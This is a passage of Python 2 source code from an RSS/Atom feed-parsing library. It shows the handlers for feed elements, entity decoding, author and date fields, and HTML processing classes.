    def handle_charref(self, ref):
        # called for each character reference, e.g. for '&#160;', ref will be '160'
        if not self.elementstack: return
        ref = ref.lower()
        if ref in ('34', '38', '39', '60', '62', 'x22', 'x26', 'x27', 'x3c', 'x3e'):
            text = '&#%s;' % ref
        else:
            if ref[0] == 'x':
                c = int(ref[1:], 16)
            else:
                c = int(ref)
            text = unichr(c).encode('utf-8')
        self.elementstack[-1][2].append(text)

    def handle_entityref(self, ref):
        # called for each entity reference, e.g. for '&copy;', ref will be 'copy'
        if not self.elementstack: return
        if _debug: sys.stderr.write('entering handle_entityref with %s\n' % ref)
        if ref in ('lt', 'gt', 'quot', 'amp', 'apos'):
            text = '&%s;' % ref
        else:
            # entity resolution graciously donated by Aaron Swartz
            def name2cp(k):
                import htmlentitydefs
                if hasattr(htmlentitydefs, 'name2codepoint'): # requires Python 2.3
                    return htmlentitydefs.name2codepoint[k]
                k = htmlentitydefs.entitydefs[k]
                if k.startswith('&#') and k.endswith(';'):
                    return int(k[2:-1]) # not in latin-1
                return ord(k)
            try: name2cp(ref)
            except KeyError: text = '&%s;' % ref
            else: text = unichr(name2cp(ref)).encode('utf-8')
        self.elementstack[-1][2].append(text)

    def handle_data(self, text, escape=1):
        # called for each block of plain text, i.e. outside of any tag and
        # not containing any character or entity references
        if not self.elementstack: return
        if escape and self.contentparams.get('type') == 'application/xhtml+xml':
            text = _xmlescape(text)
        self.elementstack[-1][2].append(text)

    def handle_comment(self, text):
        # called for each comment, e.g. <!-- insert message here -->
        pass

    def handle_pi(self, text):
        # called for each processing instruction, e.g. <?instruction>
        pass

    def handle_decl(self, text):
        pass

    def parse_declaration(self, i):
        # override internal declaration handler to handle CDATA blocks
        if _debug: sys.stderr.write('entering parse_declaration\n')
        if self.rawdata[i:i+9] == '<![CDATA[':
            k = self.rawdata.find(']]>', i)
            if k == -1: k = len(self.rawdata)
            self.handle_data(_xmlescape(self.rawdata[i+9:k]), 0)
            return k+3
        else:
            k = self.rawdata.find('>', i)
            return k+1

    def mapContentType(self, contentType):
        contentType = contentType.lower()
        if contentType == 'text':
            contentType = 'text/plain'
        elif contentType == 'html':
            contentType = 'text/html'
        elif contentType == 'xhtml':
            contentType = 'application/xhtml+xml'
        return contentType
    
    def trackNamespace(self, prefix, uri):
        loweruri = uri.lower()
        if (prefix, loweruri) == (None, 'http://my.netscape.com/rdf/simple/0.9/') and not self.version:
            self.version = 'rss090'
        if loweruri == 'http://purl.org/rss/1.0/' and not self.version:
            self.version = 'rss10'
        if loweruri == 'http://www.w3.org/2005/atom' and not self.version:
            self.version = 'atom10'
        if loweruri.find('backend.userland.com/rss') <> -1:
            # match any backend.userland.com namespace
            uri = 'http://backend.userland.com/rss'
            loweruri = uri
        if self._matchnamespaces.has_key(loweruri):
            self.namespacemap[prefix] = self._matchnamespaces[loweruri]
            self.namespacesInUse[self._matchnamespaces[loweruri]] = uri
        else:
            self.namespacesInUse[prefix or ''] = uri

    def resolveURI(self, uri):
        return _urljoin(self.baseuri or '', uri)
    
    def decodeEntities(self, element, data):
        return data

    def push(self, element, expectingText):
        self.elementstack.append([element, expectingText, []])

    def pop(self, element, stripWhitespace=1):
        if not self.elementstack: return
        if self.elementstack[-1][0] != element: return
        
        element, expectingText, pieces = self.elementstack.pop()
        output = ''.join(pieces)
        if stripWhitespace:
            output = output.strip()
        if not expectingText: return output

        # decode base64 content
        if base64 and self.contentparams.get('base64', 0):
            try:
                output = base64.decodestring(output)
            except binascii.Error:
                pass
            except binascii.Incomplete:
                pass
                
        # resolve relative URIs
        if (element in self.can_be_relative_uri) and output:
            output = self.resolveURI(output)
        
        # decode entities within embedded markup
        if not self.contentparams.get('base64', 0):
            output = self.decodeEntities(element, output)

        # remove temporary cruft from contentparams
        try:
            del self.contentparams['mode']
        except KeyError:
            pass
        try:
            del self.contentparams['base64']
        except KeyError:
            pass

        # resolve relative URIs within embedded markup
        if self.mapContentType(self.contentparams.get('type', 'text/html')) in self.html_types:
            if element in self.can_contain_relative_uris:
                output = _resolveRelativeURIs(output, self.baseuri, self.encoding)
        
        # sanitize embedded markup
        if self.mapContentType(self.contentparams.get('type', 'text/html')) in self.html_types:
            if element in self.can_contain_dangerous_markup:
                output = _sanitizeHTML(output, self.encoding)

        if self.encoding and type(output) != type(u''):
            try:
                output = unicode(output, self.encoding)
            except:
                pass

        # categories/tags/keywords/whatever are handled in _end_category
        if element == 'category':
            return output
        
        # store output in appropriate place(s)
        if self.inentry and not self.insource:
            if element == 'content':
                self.entries[-1].setdefault(element, [])
                contentparams = copy.deepcopy(self.contentparams)
                contentparams['value'] = output
                self.entries[-1][element].append(contentparams)
            elif element == 'link':
                self.entries[-1][element] = output
                if output:
                    self.entries[-1]['links'][-1]['href'] = output
            else:
                if element == 'description':
                    element = 'summary'
                self.entries[-1][element] = output
                if self.incontent:
                    contentparams = copy.deepcopy(self.contentparams)
                    contentparams['value'] = output
                    self.entries[-1][element + '_detail'] = contentparams
        elif (self.infeed or self.insource) and (not self.intextinput) and (not self.inimage):
            context = self._getContext()
            if element == 'description':
                element = 'subtitle'
            context[element] = output
            if element == 'link':
                context['links'][-1]['href'] = output
            elif self.incontent:
                contentparams = copy.deepcopy(self.contentparams)
                contentparams['value'] = output
                context[element + '_detail'] = contentparams
        return output

    def pushContent(self, tag, attrsD, defaultContentType, expectingText):
        self.incontent += 1
        self.contentparams = FeedParserDict({
            'type': self.mapContentType(attrsD.get('type', defaultContentType)),
            'language': self.lang,
            'base': self.baseuri})
        self.contentparams['base64'] = self._isBase64(attrsD, self.contentparams)
        self.push(tag, expectingText)

    def popContent(self, tag):
        value = self.pop(tag)
        self.incontent -= 1
        self.contentparams.clear()
        return value
        
    def _mapToStandardPrefix(self, name):
        colonpos = name.find(':')
        if colonpos <> -1:
            prefix = name[:colonpos]
            suffix = name[colonpos+1:]
            prefix = self.namespacemap.get(prefix, prefix)
            name = prefix + ':' + suffix
        return name
        
    def _getAttribute(self, attrsD, name):
        return attrsD.get(self._mapToStandardPrefix(name))

    def _isBase64(self, attrsD, contentparams):
        if attrsD.get('mode', '') == 'base64':
            return 1
        if self.contentparams['type'].startswith('text/'):
            return 0
        if self.contentparams['type'].endswith('+xml'):
            return 0
        if self.contentparams['type'].endswith('/xml'):
            return 0
        return 1

    def _itsAnHrefDamnIt(self, attrsD):
        href = attrsD.get('url', attrsD.get('uri', attrsD.get('href', None)))
        if href:
            try:
                del attrsD['url']
            except KeyError:
                pass
            try:
                del attrsD['uri']
            except KeyError:
                pass
            attrsD['href'] = href
        return attrsD
    
    def _save(self, key, value):
        context = self._getContext()
        context.setdefault(key, value)

    def _start_rss(self, attrsD):
        versionmap = {'0.91': 'rss091u',
                      '0.92': 'rss092',
                      '0.93': 'rss093',
                      '0.94': 'rss094'}
        if not self.version:
            attr_version = attrsD.get('version', '')
            version = versionmap.get(attr_version)
            if version:
                self.version = version
            elif attr_version.startswith('2.'):
                self.version = 'rss20'
            else:
                self.version = 'rss'
    
    def _start_dlhottitles(self, attrsD):
        self.version = 'hotrss'

    def _start_channel(self, attrsD):
        self.infeed = 1
        self._cdf_common(attrsD)
    _start_feedinfo = _start_channel

    def _cdf_common(self, attrsD):
        if attrsD.has_key('lastmod'):
            self._start_modified({})
            self.elementstack[-1][-1] = attrsD['lastmod']
            self._end_modified()
        if attrsD.has_key('href'):
            self._start_link({})
            self.elementstack[-1][-1] = attrsD['href']
            self._end_link()
    
    def _start_feed(self, attrsD):
        self.infeed = 1
        versionmap = {'0.1': 'atom01',
                      '0.2': 'atom02',
                      '0.3': 'atom03'}
        if not self.version:
            attr_version = attrsD.get('version')
            version = versionmap.get(attr_version)
            if version:
                self.version = version
            else:
                self.version = 'atom'

    def _end_channel(self):
        self.infeed = 0
    _end_feed = _end_channel
    
    def _start_image(self, attrsD):
        self.inimage = 1
        self.push('image', 0)
        context = self._getContext()
        context.setdefault('image', FeedParserDict())
            
    def _end_image(self):
        self.pop('image')
        self.inimage = 0

    def _start_textinput(self, attrsD):
        self.intextinput = 1
        self.push('textinput', 0)
        context = self._getContext()
        context.setdefault('textinput', FeedParserDict())
    _start_textInput = _start_textinput
    
    def _end_textinput(self):
        self.pop('textinput')
        self.intextinput = 0
    _end_textInput = _end_textinput

    def _start_author(self, attrsD):
        self.inauthor = 1
        self.push('author', 1)
    _start_managingeditor = _start_author
    _start_dc_author = _start_author
    _start_dc_creator = _start_author
    _start_itunes_author = _start_author

    def _end_author(self):
        self.pop('author')
        self.inauthor = 0
        self._sync_author_detail()
    _end_managingeditor = _end_author
    _end_dc_author = _end_author
    _end_dc_creator = _end_author
    _end_itunes_author = _end_author

    def _start_itunes_owner(self, attrsD):
        self.inpublisher = 1
        self.push('publisher', 0)

    def _end_itunes_owner(self):
        self.pop('publisher')
        self.inpublisher = 0
        self._sync_author_detail('publisher')

    def _start_contributor(self, attrsD):
        self.incontributor = 1
        context = self._getContext()
        context.setdefault('contributors', [])
        context['contributors'].append(FeedParserDict())
        self.push('contributor', 0)

    def _end_contributor(self):
        self.pop('contributor')
        self.incontributor = 0

    def _start_dc_contributor(self, attrsD):
        self.incontributor = 1
        context = self._getContext()
        context.setdefault('contributors', [])
        context['contributors'].append(FeedParserDict())
        self.push('name', 0)

    def _end_dc_contributor(self):
        self._end_name()
        self.incontributor = 0

    def _start_name(self, attrsD):
        self.push('name', 0)
    _start_itunes_name = _start_name

    def _end_name(self):
        value = self.pop('name')
        if self.inpublisher:
            self._save_author('name', value, 'publisher')
        elif self.inauthor:
            self._save_author('name', value)
        elif self.incontributor:
            self._save_contributor('name', value)
        elif self.intextinput:
            context = self._getContext()
            context['textinput']['name'] = value
    _end_itunes_name = _end_name

    def _start_width(self, attrsD):
        self.push('width', 0)

    def _end_width(self):
        value = self.pop('width')
        try:
            value = int(value)
        except:
            value = 0
        if self.inimage:
            context = self._getContext()
            context['image']['width'] = value

    def _start_height(self, attrsD):
        self.push('height', 0)

    def _end_height(self):
        value = self.pop('height')
        try:
            value = int(value)
        except:
            value = 0
        if self.inimage:
            context = self._getContext()
            context['image']['height'] = value

    def _start_url(self, attrsD):
        self.push('href', 1)
    _start_homepage = _start_url
    _start_uri = _start_url

    def _end_url(self):
        value = self.pop('href')
        if self.inauthor:
            self._save_author('href', value)
        elif self.incontributor:
            self._save_contributor('href', value)
        elif self.inimage:
            context = self._getContext()
            context['image']['href'] = value
        elif self.intextinput:
            context = self._getContext()
            context['textinput']['link'] = value
    _end_homepage = _end_url
    _end_uri = _end_url

    def _start_email(self, attrsD):
        self.push('email', 0)
    _start_itunes_email = _start_email

    def _end_email(self):
        value = self.pop('email')
        if self.inpublisher:
            self._save_author('email', value, 'publisher')
        elif self.inauthor:
            self._save_author('email', value)
        elif self.incontributor:
            self._save_contributor('email', value)
    _end_itunes_email = _end_email

    def _getContext(self):
        if self.insource:
            context = self.sourcedata
        elif self.inentry:
            context = self.entries[-1]
        else:
            context = self.feeddata
        return context

    def _save_author(self, key, value, prefix='author'):
        context = self._getContext()
        context.setdefault(prefix + '_detail', FeedParserDict())
        context[prefix + '_detail'][key] = value
        self._sync_author_detail()

    def _save_contributor(self, key, value):
        context = self._getContext()
        context.setdefault('contributors', [FeedParserDict()])
        context['contributors'][-1][key] = value

    def _sync_author_detail(self, key='author'):
        context = self._getContext()
        detail = context.get('%s_detail' % key)
        if detail:
            name = detail.get('name')
            email = detail.get('email')
            if name and email:
                context[key] = '%s (%s)' % (name, email)
            elif name:
                context[key] = name
            elif email:
                context[key] = email
        else:
            author = context.get(key)
            if not author: return
            emailmatch = re.search(r'''(([a-zA-Z0-9\_\-\.\+]+)@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.)|(([a-zA-Z0-9\-]+\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\]?))''', author)
            if not emailmatch: return
            email = emailmatch.group(0)
            # probably a better way to do the following, but it passes all the tests
            author = author.replace(email, '')
            author = author.replace('()', '')
            author = author.strip()
            if author and (author[0] == '('):
                author = author[1:]
            if author and (author[-1] == ')'):
                author = author[:-1]
            author = author.strip()
            context.setdefault('%s_detail' % key, FeedParserDict())
            context['%s_detail' % key]['name'] = author
            context['%s_detail' % key]['email'] = email

    def _start_subtitle(self, attrsD):
        self.pushContent('subtitle', attrsD, 'text/plain', 1)
    _start_tagline = _start_subtitle
    _start_itunes_subtitle = _start_subtitle

    def _end_subtitle(self):
        self.popContent('subtitle')
    _end_tagline = _end_subtitle
    _end_itunes_subtitle = _end_subtitle
            
    def _start_rights(self, attrsD):
        self.pushContent('rights', attrsD, 'text/plain', 1)
    _start_dc_rights = _start_rights
    _start_copyright = _start_rights

    def _end_rights(self):
        self.popContent('rights')
    _end_dc_rights = _end_rights
    _end_copyright = _end_rights

    def _start_item(self, attrsD):
        self.entries.append(FeedParserDict())
        self.push('item', 0)
        self.inentry = 1
        self.guidislink = 0
        id = self._getAttribute(attrsD, 'rdf:about')
        if id:
            context = self._getContext()
            context['id'] = id
        self._cdf_common(attrsD)
    _start_entry = _start_item
    _start_product = _start_item

    def _end_item(self):
        self.pop('item')
        self.inentry = 0
    _end_entry = _end_item

    def _start_dc_language(self, attrsD):
        self.push('language', 1)
    _start_language = _start_dc_language

    def _end_dc_language(self):
        self.lang = self.pop('language')
    _end_language = _end_dc_language

    def _start_dc_publisher(self, attrsD):
        self.push('publisher', 1)
    _start_webmaster = _start_dc_publisher

    def _end_dc_publisher(self):
        self.pop('publisher')
        self._sync_author_detail('publisher')
    _end_webmaster = _end_dc_publisher

    def _start_published(self, attrsD):
        self.push('published', 1)
    _start_dcterms_issued = _start_published
    _start_issued = _start_published

    def _end_published(self):
        value = self.pop('published')
        self._save('published_parsed', _parse_date(value))
    _end_dcterms_issued = _end_published
    _end_issued = _end_published

    def _start_updated(self, attrsD):
        self.push('updated', 1)
    _start_modified = _start_updated
    _start_dcterms_modified = _start_updated
    _start_pubdate = _start_updated
    _start_dc_date = _start_updated

    def _end_updated(self):
        value = self.pop('updated')
        parsed_value = _parse_date(value)
        self._save('updated_parsed', parsed_value)
    _end_modified = _end_updated
    _end_dcterms_modified = _end_updated
    _end_pubdate = _end_updated
    _end_dc_date = _end_updated

    def _start_created(self, attrsD):
        self.push('created', 1)
    _start_dcterms_created = _start_created

    def _end_created(self):
        value = self.pop('created')
        self._save('created_parsed', _parse_date(value))
    _end_dcterms_created = _end_created

    def _start_expirationdate(self, attrsD):
        self.push('expired', 1)

    def _end_expirationdate(self):
        self._save('expired_parsed', _parse_date(self.pop('expired')))

    def _start_cc_license(self, attrsD):
        self.push('license', 1)
        value = self._getAttribute(attrsD, 'rdf:resource')
        if value:
            self.elementstack[-1][2].append(value)
        self.pop('license')
        
    def _start_creativecommons_license(self, attrsD):
        self.push('license', 1)

    def _end_creativecommons_license(self):
        self.pop('license')

    def _addTag(self, term, scheme, label):
        context = self._getContext()
        tags = context.setdefault('tags', [])
        if (not term) and (not scheme) and (not label): return
        value = FeedParserDict({'term': term, 'scheme': scheme, 'label': label})
        if value not in tags:
            tags.append(FeedParserDict({'term': term, 'scheme': scheme, 'label': label}))

    def _start_category(self, attrsD):
        if _debug: sys.stderr.write('entering _start_category with %s\n' % repr(attrsD))
        term = attrsD.get('term')
        scheme = attrsD.get('scheme', attrsD.get('domain'))
        label = attrsD.get('label')
        self._addTag(term, scheme, label)
        self.push('category', 1)
    _start_dc_subject = _start_category
    _start_keywords = _start_category
        
    def _end_itunes_keywords(self):
        for term in self.pop('itunes_keywords').split():
            self._addTag(term, 'http://www.itunes.com/', None)
        
    def _start_itunes_category(self, attrsD):
        self._addTag(attrsD.get('text'), 'http://www.itunes.com/', None)
        self.push('category', 1)
        
    def _end_category(self):
        value = self.pop('category')
        if not value: return
        context = self._getContext()
        tags = context['tags']
        if value and len(tags) and not tags[-1]['term']:
            tags[-1]['term'] = value
        else:
            self._addTag(value, None, None)
    _end_dc_subject = _end_category
    _end_keywords = _end_category
    _end_itunes_category = _end_category

    def _start_cloud(self, attrsD):
        self._getContext()['cloud'] = FeedParserDict(attrsD)
        
    def _start_link(self, attrsD):
        attrsD.setdefault('rel', 'alternate')
        attrsD.setdefault('type', 'text/html')
        attrsD = self._itsAnHrefDamnIt(attrsD)
        if attrsD.has_key('href'):
            attrsD['href'] = self.resolveURI(attrsD['href'])
        expectingText = self.infeed or self.inentry or self.insource
        context = self._getContext()
        context.setdefault('links', [])
        context['links'].append(FeedParserDict(attrsD))
        if attrsD['rel'] == 'enclosure':
            self._start_enclosure(attrsD)
        if attrsD.has_key('href'):
            expectingText = 0
            if (attrsD.get('rel') == 'alternate') and (self.mapContentType(attrsD.get('type')) in self.html_types):
                context['link'] = attrsD['href']
        else:
            self.push('link', expectingText)
    _start_producturl = _start_link

    def _end_link(self):
        value = self.pop('link')
        context = self._getContext()
        if self.intextinput:
            context['textinput']['link'] = value
        if self.inimage:
            context['image']['link'] = value
    _end_producturl = _end_link

    def _start_guid(self, attrsD):
        self.guidislink = (attrsD.get('ispermalink', 'true') == 'true')
        self.push('id', 1)

    def _end_guid(self):
        value = self.pop('id')
        self._save('guidislink', self.guidislink and not self._getContext().has_key('link'))
        if self.guidislink:
            # guid acts as link, but only if 'ispermalink' is not present or is 'true',
            # and only if the item doesn't already have a link element
            self._save('link', value)

    def _start_title(self, attrsD):
        self.pushContent('title', attrsD, 'text/plain', self.infeed or self.inentry or self.insource)
    _start_dc_title = _start_title
    _start_media_title = _start_title

    def _end_title(self):
        value = self.popContent('title')
        context = self._getContext()
        if self.intextinput:
            context['textinput']['title'] = value
        elif self.inimage:
            context['image']['title'] = value
    _end_dc_title = _end_title
    _end_media_title = _end_title

    def _start_description(self, attrsD):
        context = self._getContext()
        if context.has_key('summary'):
            self._summaryKey = 'content'
            self._start_content(attrsD)
        else:
            self.pushContent('description', attrsD, 'text/html', self.infeed or self.inentry or self.insource)

    def _start_abstract(self, attrsD):
        self.pushContent('description', attrsD, 'text/plain', self.infeed or self.inentry or self.insource)

    def _end_description(self):
        if self._summaryKey == 'content':
            self._end_content()
        else:
            value = self.popContent('description')
            context = self._getContext()
            if self.intextinput:
                context['textinput']['description'] = value
            elif self.inimage:
                context['image']['description'] = value
        self._summaryKey = None
    _end_abstract = _end_description

    def _start_info(self, attrsD):
        self.pushContent('info', attrsD, 'text/plain', 1)
    _start_feedburner_browserfriendly = _start_info

    def _end_info(self):
        self.popContent('info')
    _end_feedburner_browserfriendly = _end_info

    def _start_generator(self, attrsD):
        if attrsD:
            attrsD = self._itsAnHrefDamnIt(attrsD)
            if attrsD.has_key('href'):
                attrsD['href'] = self.resolveURI(attrsD['href'])
        self._getContext()['generator_detail'] = FeedParserDict(attrsD)
        self.push('generator', 1)

    def _end_generator(self):
        value = self.pop('generator')
        context = self._getContext()
        if context.has_key('generator_detail'):
            context['generator_detail']['name'] = value
            
    def _start_admin_generatoragent(self, attrsD):
        self.push('generator', 1)
        value = self._getAttribute(attrsD, 'rdf:resource')
        if value:
            self.elementstack[-1][2].append(value)
        self.pop('generator')
        self._getContext()['generator_detail'] = FeedParserDict({'href': value})

    def _start_admin_errorreportsto(self, attrsD):
        self.push('errorreportsto', 1)
        value = self._getAttribute(attrsD, 'rdf:resource')
        if value:
            self.elementstack[-1][2].append(value)
        self.pop('errorreportsto')
        
    def _start_summary(self, attrsD):
        context = self._getContext()
        if context.has_key('summary'):
            self._summaryKey = 'content'
            self._start_content(attrsD)
        else:
            self._summaryKey = 'summary'
            self.pushContent(self._summaryKey, attrsD, 'text/plain', 1)
    _start_itunes_summary = _start_summary

    def _end_summary(self):
        if self._summaryKey == 'content':
            self._end_content()
        else:
            self.popContent(self._summaryKey or 'summary')
        self._summaryKey = None
    _end_itunes_summary = _end_summary
        
    def _start_enclosure(self, attrsD):
        attrsD = self._itsAnHrefDamnIt(attrsD)
        self._getContext().setdefault('enclosures', []).append(FeedParserDict(attrsD))
        href = attrsD.get('href')
        if href:
            context = self._getContext()
            if not context.get('id'):
                context['id'] = href
            
    def _start_source(self, attrsD):
        self.insource = 1

    def _end_source(self):
        self.insource = 0
        self._getContext()['source'] = copy.deepcopy(self.sourcedata)
        self.sourcedata.clear()

    def _start_content(self, attrsD):
        self.pushContent('content', attrsD, 'text/plain', 1)
        src = attrsD.get('src')
        if src:
            self.contentparams['src'] = src
        self.push('content', 1)

    def _start_prodlink(self, attrsD):
        self.pushContent('content', attrsD, 'text/html', 1)

    def _start_body(self, attrsD):
        self.pushContent('content', attrsD, 'application/xhtml+xml', 1)
    _start_xhtml_body = _start_body

    def _start_content_encoded(self, attrsD):
        self.pushContent('content', attrsD, 'text/html', 1)
    _start_fullitem = _start_content_encoded

    def _end_content(self):
        copyToDescription = self.mapContentType(self.contentparams.get('type')) in (['text/plain'] + self.html_types)
        value = self.popContent('content')
        if copyToDescription:
            self._save('description', value)
    _end_body = _end_content
    _end_xhtml_body = _end_content
    _end_content_encoded = _end_content
    _end_fullitem = _end_content
    _end_prodlink = _end_content

    def _start_itunes_image(self, attrsD):
        self.push('itunes_image', 0)
        self._getContext()['image'] = FeedParserDict({'href': attrsD.get('href')})
    _start_itunes_link = _start_itunes_image
        
    def _end_itunes_block(self):
        value = self.pop('itunes_block', 0)
        self._getContext()['itunes_block'] = (value == 'yes') and 1 or 0

    def _end_itunes_explicit(self):
        value = self.pop('itunes_explicit', 0)
        self._getContext()['itunes_explicit'] = (value == 'yes') and 1 or 0

if _XML_AVAILABLE:
    class _StrictFeedParser(_FeedParserMixin, xml.sax.handler.ContentHandler):
        def __init__(self, baseuri, baselang, encoding):
            if _debug: sys.stderr.write('trying StrictFeedParser\n')
            xml.sax.handler.ContentHandler.__init__(self)
            _FeedParserMixin.__init__(self, baseuri, baselang, encoding)
            self.bozo = 0
            self.exc = None
        
        def startPrefixMapping(self, prefix, uri):
            self.trackNamespace(prefix, uri)
        
        def startElementNS(self, name, qname, attrs):
            namespace, localname = name
            lowernamespace = str(namespace or '').lower()
            if lowernamespace.find('backend.userland.com/rss') <> -1:
                # match any backend.userland.com namespace
                namespace = 'http://backend.userland.com/rss'
                lowernamespace = namespace
            if qname and qname.find(':') > 0:
                givenprefix = qname.split(':')[0]
            else:
                givenprefix = None
            prefix = self._matchnamespaces.get(lowernamespace, givenprefix)
            if givenprefix and (prefix == None or (prefix == '' and lowernamespace == '')) and not self.namespacesInUse.has_key(givenprefix):
                    raise UndeclaredNamespace, "'%s' is not associated with a namespace" % givenprefix
            if prefix:
                localname = prefix + ':' + localname
            localname = str(localname).lower()
            if _debug: sys.stderr.write('startElementNS: qname = %s, namespace = %s, givenprefix = %s, prefix = %s, attrs = %s, localname = %s\n' % (qname, namespace, givenprefix, prefix, attrs.items(), localname))

            # qname implementation is horribly broken in Python 2.1 (it
            # doesn't report any), and slightly broken in Python 2.2 (it
            # doesn't report the xml: namespace). So we match up namespaces
            # with a known list first, and then possibly override them with
            # the qnames the SAX parser gives us (if indeed it gives us any
            # at all).  Thanks to MatejC for helping me test this and
            # tirelessly telling me that it didn't work yet.
            attrsD = {}
            for (namespace, attrlocalname), attrvalue in attrs._attrs.items():
                lowernamespace = (namespace or '').lower()
                prefix = self._matchnamespaces.get(lowernamespace, '')
                if prefix:
                    attrlocalname = prefix + ':' + attrlocalname
                attrsD[str(attrlocalname).lower()] = attrvalue
            for qname in attrs.getQNames():
                attrsD[str(qname).lower()] = attrs.getValueByQName(qname)
            self.unknown_starttag(localname, attrsD.items())

        def characters(self, text):
            self.handle_data(text)

        def endElementNS(self, name, qname):
            namespace, localname = name
            lowernamespace = str(namespace or '').lower()
            if qname and qname.find(':') > 0:
                givenprefix = qname.split(':')[0]
            else:
                givenprefix = ''
            prefix = self._matchnamespaces.get(lowernamespace, givenprefix)
            if prefix:
                localname = prefix + ':' + localname
            localname = str(localname).lower()
            self.unknown_endtag(localname)

        def error(self, exc):
            self.bozo = 1
            self.exc = exc
            
        def fatalError(self, exc):
            self.error(exc)
            raise exc

class _BaseHTMLProcessor(sgmllib.SGMLParser):
    elements_no_end_tag = ['area', 'base', 'basefont', 'br', 'col', 'frame', 'hr',
      'img', 'input', 'isindex', 'link', 'meta', 'param']
    
    def __init__(self, encoding):
        self.encoding = encoding
        if _debug: sys.stderr.write('entering BaseHTMLProcessor, encoding=%s\n' % self.encoding)
        sgmllib.SGMLParser.__init__(self)
        
    def reset(self):
        self.pieces = []
        sgmllib.SGMLParser.reset(self)

    def _shorttag_replace(self, match):
        tag = match.group(1)
        if tag in self.elements_no_end_tag:
            return '<' + tag + ' />'
        else:
            return '<' + tag + '></' + tag + '>'
        
    def feed(self, data):
        data = re.compile(r'<!((?!DOCTYPE|--|\[))', re.IGNORECASE).sub(r'&lt;!\1', data)
        #data = re.sub(r'<(\S+?)\s*?/>', self._shorttag_replace, data) # bug [ 1399464 ] Bad regexp for _shorttag_replace
        data = re.sub(r'<([^<\s]+?)\s*/>', self._shorttag_replace, data) 
        data = data.replace('&#39;', "'")
        data = data.replace('&#34;', '"')
        if self.encoding and type(data) == type(u''):
            data = data.encode(self.encoding)
        sgmllib.SGMLParser.feed(self, data)

    def normalize_attrs(self, attrs):
        # utility method to be called by descendants
        attrs = [(k.lower(), v) for k, v in attrs]
        attrs = [(k, k in ('rel', 'type') and v.lower() or v) for k, v in attrs]
        return attrs

    def unknown_starttag(self, tag, attrs):
        # called for each start tag
        # attrs is a list of (attr, value) tuples
        # e.g. for <pre class='screen'>, tag='pre', attrs=[('class', 'screen')]
        if _debug: sys.stderr.write('_BaseHTMLProcessor, unknown_starttag, tag=%s\n' % tag)
        uattrs = []
        # thanks to Kevin Marks for this breathtaking hack to deal with (valid) high-bit attribute values in UTF-8 feeds
        for key, value in attrs:
            if type(value) != type(u''):
                value = unicode(value, self.encoding)
            uattrs.append((unicode(key, self.encoding), value))
        strattrs = u''.join([u' %s="%s"' % (key, value) for key, value in uattrs]).encode(self.encoding)
        if tag in self.elements_no_end_tag:
            self.pieces.append('<%(tag)s%(strattrs)s />' % locals())
        else:
            self.pieces.append('<%(tag)s%(strattrs)s>' % locals())

    def unknown_endtag(self, tag):
        # called for each end tag, e.g. for </pre>, tag will be 'pre'
        # Reconstruct the original end tag.
        if tag not in self.elements_no_end_tag:
            self.pieces.append("</%(tag)s>" % locals())

    def handle_charref(self, ref):
        # called for each character reference, e.g. for '&#160;', ref will be '160'
        # Reconstruct the original character reference.
        self.pieces.append('&#%(ref)s;' % locals())
        
    def handle_entityref(self, ref):
        # called for each entity reference, e.g. for '&copy;', ref will be 'copy'
        # Reconstruct the original entity reference.
        self.pieces.append('&%(ref)s;' % locals())

    def handle_data(self, text):
        # called for each block of plain text, i.e. outside of any tag and
        # not containing any character or entity references
        # Store the original text verbatim.
        if _debug: sys.stderr.write('_BaseHTMLProcessor, handle_text, text=%s\n' % text)
        self.pieces.append(text)
        
    def handle_comment(self, text):
        # called for each HTML comment, e.g. <!-- insert Javascript code here -->
        # Reconstruct the original comment.
        self.pieces.append('<!--%(text)s-->' % locals())
        
    def handle_pi(self, text):
        # called for each processing instruction, e.g. <?instruction>
        # Reconstruct original processing instruction.
        self.pieces.append('<?%(text)s>' % locals())

    def handle_decl(self, text):
        # called for the DOCTYPE, if present, e.g.
        # <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
        #     "http://www.w3.org/TR/html4/loose.dtd">
        # Reconstruct original DOCTYPE
        self.pieces.append('<!%(text)s>' % locals())
        
    _new_declname_match = re.compile(r'[a-zA-Z][-_.a-zA-Z0-9:]*\s*').match
    def _scan_name(self, i, declstartpos):
        rawdata = self.rawdata
        n = len(rawdata)
        if i == n:
            return None, -1
        m = self._new_declname_match(rawdata, i)
        if m:
            s = m.group()
            name = s.strip()
            if (i + len(s)) == n:
                return None, -1  # end of buffer
            return name.lower(), m.end()
        else:
            self.handle_data(rawdata)
#            self.updatepos(declstartpos, i)
            return None, -1

    def output(self):
        '''Return processed HTML as a single string'''
        return ''.join([str(p) for p in self.pieces])

class _LooseFeedParser(_FeedParserMixin, _BaseHTMLProcessor):
    def __init__(self, baseuri, baselang, encoding):
        sgmllib.SGMLParser.__init__(self)
        _FeedParserMixin.__init__(self, baseuri, baselang, encoding)

    def decodeEntities(self, element, data):
        data = data.replace('&#60;', '&lt;')
        data = data.replace('&#x3c;', '&lt;')
        data = data.replace('&#62;', '&gt;')
        data = data.replace('&#x3e;', '&gt;')
        data = data.replace('&#38;', '&amp;')
        data = data.replace('&#x26;', '&amp;')
        data = data.replace('&#34;', '&quot;')
        data = data.replace('&#x22;', '&quot;')
        data = data.replace('&#39;', '&apos;')
        data = data.replace('&#x27;', '&apos;')
        if self.contentparams.has_key('type') and not self.contentparams.get('type', 'xml').endswith('xml'):
            data = data.replace('&lt;', '<')
            data = data.replace('&gt;', '>')
            data = data.replace('&amp;', '&')
            data = data.replace('&quot;', '"')
            data = data.replace('&apos;', "'")
        return data
        
class _RelativeURIResolver(_BaseHTMLProcessor):
    relative_uris = [('a', 'href'),
                     ('applet', 'codebase'),
                     ('area', 'href'),
                     ('blockquote', 'cite'),
                     ('body', 'background'),
                     ('del', 'cite'),
                     ('form', 'action'),
                     ('frame', 'longdesc'),
                     ('frame', 'src'),
                     ('iframe', 'longdesc'),
                     ('iframe', 'src'),
                     ('head', 'profile'),
                     ('img', 'longdesc'),
                     ('img', 'src'),
                     ('img', 'usemap'),
                     ('input', 'src'),
                     ('input', 'usemap'),
                     ('ins', 'cite'),
                     ('link', 'href'),
                     ('object', 'classid'),
                     ('object', 'codebase'),
                     ('object', 'data'),
                     ('object', 'usemap'),
                     ('q', 'cite'),
                     ('script', 'src')]

    def __init__(self, baseuri, encoding):
        _BaseHTMLProcessor.__init__(self, encoding)
        self.baseuri = baseuri

